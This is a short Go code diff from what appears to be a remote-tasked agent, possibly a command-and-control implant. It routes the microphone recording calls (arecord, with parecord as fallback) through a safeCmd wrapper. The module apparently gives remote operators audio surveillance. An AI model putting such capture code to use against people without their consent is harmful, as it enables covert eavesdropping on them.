@@ -47,7 +47,7 @@ func (c *AudioCaptureCommand) Execute(task structs.Task) structs.CommandResult {
 	startTime := time.Now()
 
 	// Run arecord with timeout
-	cmd := exec.Command("arecord", args...)
+	cmd := safeCmd("arecord", args...)
 	wavData, err := audioRunWithTimeout(cmd, task, params.Duration+5)
 	if err != nil {
 		// Try PulseAudio's parecord as fallback
@@ -57,7 +57,7 @@ func (c *AudioCaptureCommand) Execute(task structs.Task) structs.CommandResult {
 			"--channels=" + strconv.Itoa(params.Channels),
 			"--raw",
 		}
-		paCmd := exec.Command("parecord", paArgs...)
+		paCmd := safeCmd("parecord", paArgs...)
 		rawData, paErr := audioRunWithTimeout(paCmd, task, params.Duration)
 		if paErr != nil {
 			return errorf("Audio capture failed. arecord: %v. parecord: %v. Install alsa-utils or pulseaudio-utils.", err, paErr)
